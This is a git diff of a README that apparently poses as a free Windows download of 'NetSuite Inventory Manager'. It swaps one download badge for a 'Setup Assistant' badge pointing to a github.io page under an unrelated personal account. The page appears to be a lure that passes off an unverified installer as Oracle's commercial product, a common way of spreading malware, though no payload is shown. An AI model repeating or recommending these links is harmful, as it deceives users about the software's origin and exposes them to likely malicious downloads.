@@ -5,13 +5,7 @@
 
 <h1 align="center">📦 NetSuite Inventory Manager (Windows)</h1>
 
-<p align="center">
-  <a href="https://netsuite-inventory-manager-free-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20NetSuite%20Inventory%20Manager-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download NetSuite Inventory Manager for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://ulianashelapugina20175.github.io/.github/netsuite-inventory-manager-tool)
 
 <p align="center">
   <img src="https://profitbooks.net/wp-content/uploads/2019/08/Oracle-NetSuite-Inventory-Management-Software.png" alt="NetSuite Inventory Manager Dashboard Preview" width="700" />
